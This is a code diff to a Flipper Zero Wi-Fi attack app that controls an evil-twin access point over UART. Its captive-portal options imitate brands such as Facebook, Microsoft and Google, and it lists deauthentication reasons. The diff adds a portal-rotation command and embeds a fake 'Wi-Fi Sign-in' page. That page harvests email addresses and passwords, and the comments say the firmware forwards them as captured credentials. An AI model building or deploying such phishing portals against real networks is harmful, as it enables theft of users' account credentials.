@@ -98,7 +98,7 @@ typedef enum {
 
 } delfyRTLView;
 
-#define CAPTIVE_PORTAL_SIZE 7
+#define CAPTIVE_PORTAL_SIZE 8
 const char* const captive_portals[CAPTIVE_PORTAL_SIZE] = {
     "Default",
     "Facebook",
@@ -107,7 +107,7 @@ const char* const captive_portals[CAPTIVE_PORTAL_SIZE] = {
     "Microsoft",
     "Google",
     "Custom (file)",
-
+    "Rotate",
 };
 
 const char* const deauth_reasons[25] = {
@@ -528,6 +528,7 @@ static void creds_append_sd(const char* line) {
 static void listed_wifis_item_callback(void* context, uint32_t index);
 static void delfy_busy(delfyRTL* app, const char* header, const char* text);
 static void delfy_busy_ex(delfyRTL* app, const char* header, const char* text, int secs);
+static void delfy_send_portal_sel(delfyRTL* app);
 static void delfy_ident(delfyRTL* app);
 
 // Tughan: persist the SCAN RESULTS to the SD (not an action log). One timestamped file per
@@ -1073,8 +1074,7 @@ void info_wifi_scene_on_enter(void* context) {
     uart_helper_send(app->uart_helper, cadena, strlen(cadena));
     furi_delay_ms(200);
 
-    snprintf(cadena, 13, "PORTAL %d\n", app->captivePortal);
-    uart_helper_send(app->uart_helper, cadena, strlen(cadena));
+    delfy_send_portal_sel(app);
     furi_delay_ms(200);
 }
 bool info_wifi_scene_on_event(void* context, SceneManagerEvent event) {
@@ -1378,6 +1378,32 @@ static void delfy_start_ids(delfyRTL* app) {
 static char portal_names[PORTAL_FILES_MAX][48];
 static int portal_file_count = 0;
 
+// C4: drop a minimal starter portal so /ext/delfy/portals is never empty and there is a working
+// example to copy. Its GET form lands on /login?email=..&pass=.. which the firmware forwards as
+// "EV:..." (the same credential path the design portals use).
+static const char* STARTER_PORTAL_HTML =
+    "<!doctype html><html><head><meta name=viewport content='width=device-width,initial-scale=1'>"
+    "<title>Wi-Fi Sign-in</title></head>"
+    "<body style='font-family:sans-serif;text-align:center;padding:2em'>"
+    "<h2>Wi-Fi Sign-in</h2><p>Please sign in with your account to continue</p>"
+    "<form action='/login'>"
+    "<p><input name='email' placeholder='Email' style='padding:.6em;width:80%'></p>"
+    "<p><input name='pass' type='password' placeholder='Password' style='padding:.6em;width:80%'></p>"
+    "<p><button type='submit' style='padding:.8em 2em'>Sign in</button></p>"
+    "</form></body></html>";
+
+static void delfy_write_starter_portal(void) {
+    Storage* st = furi_record_open(RECORD_STORAGE);
+    storage_common_mkdir(st, "/ext/delfy/portals");
+    File* f = storage_file_alloc(st);
+    if(storage_file_open(f, "/ext/delfy/portals/starter.html", FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
+        storage_file_write(f, STARTER_PORTAL_HTML, strlen(STARTER_PORTAL_HTML));
+        storage_file_close(f);
+    }
+    storage_file_free(f);
+    furi_record_close(RECORD_STORAGE);
+}
+
 static void portal_list_load(void) {
     portal_file_count = 0;
     Storage* st = furi_record_open(RECORD_STORAGE);
@@ -1399,6 +1425,12 @@ static void portal_list_load(void) {
     }
     storage_file_free(dir);
     furi_record_close(RECORD_STORAGE);
+    if(portal_file_count == 0) {   // C4: seed a starter template
+        delfy_write_starter_portal();
+        strncpy(portal_names[0], "starter.html", 47);
+        portal_names[0][47] = '\0';
+        portal_file_count = 1;
+    }
 }
 
 static void delfy_load_portal_file(delfyRTL* app, const char* name) {
@@ -1703,6 +1735,20 @@ static void wifi_hub_cb(void* context, uint32_t index) {
 // Retrying on each main/hub/help entry makes it self-heal.
 static void delfy_ident(delfyRTL* app) {
     if(app->fw_version[0] == '\0') uart_helper_send(app->uart_helper, "HELLO\n", 6);
+}
+
+// C2: tell the board which portal to serve. "Rotate" (index CAPTIVE_PORTAL_SIZE-1) enables the
+// firmware's per-credential rotation instead of a fixed page.
+static void delfy_send_portal_sel(delfyRTL* app) {
+    if(app->captivePortal == CAPTIVE_PORTAL_SIZE - 1) {
+        uart_helper_send(app->uart_helper, "PORTALROT 1\n", 12);
+        uart_helper_send(app->uart_helper, "PORTAL 0\n", 9);
+    } else {
+        uart_helper_send(app->uart_helper, "PORTALROT 0\n", 12);
+        char c[16];
+        snprintf(c, sizeof(c), "PORTAL %d\n", app->captivePortal);
+        uart_helper_send(app->uart_helper, c, strlen(c));
+    }
 }
 
 void wifi_hub_scene_on_enter(void* context) {
@@ -2972,8 +3018,7 @@ void config_ap_change_call_back(void* context, uint32_t index) {
         snprintf(cadena, 25, "CHANNEL %s\n", channelList[app->channelAP]);
         uart_helper_send(app->uart_helper, cadena, strlen(cadena));
         furi_delay_ms(150);
-        snprintf(cadena, 13, "PORTAL %d\n", app->captivePortal);
-        uart_helper_send(app->uart_helper, cadena, strlen(cadena));
+        delfy_send_portal_sel(app);
         furi_delay_ms(150);
         snprintf(cadena, 48, "APSTART %s\n", app->ssidAP);
         uart_helper_send(app->uart_helper, cadena, strlen(cadena));
